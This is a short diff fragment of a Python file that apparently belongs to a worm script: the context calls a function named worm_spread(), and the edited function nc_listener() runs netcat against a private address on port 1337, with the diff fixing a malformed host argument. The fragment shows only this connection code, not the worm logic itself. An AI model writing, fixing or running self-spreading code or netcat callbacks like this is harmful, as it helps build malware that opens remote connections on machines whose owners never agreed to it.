@@ -29,8 +29,7 @@ def worm_spread():
 print(worm_spread())
 
 def nc_listener():
-    nc_setup=subprocess.run(["netcat", "192.168.56.111/24", "1337"])
-    return nc_setup
+    subprocess.run(["netcat", "192.168.56.111", "1337"])
 print(nc_listener())
     
 
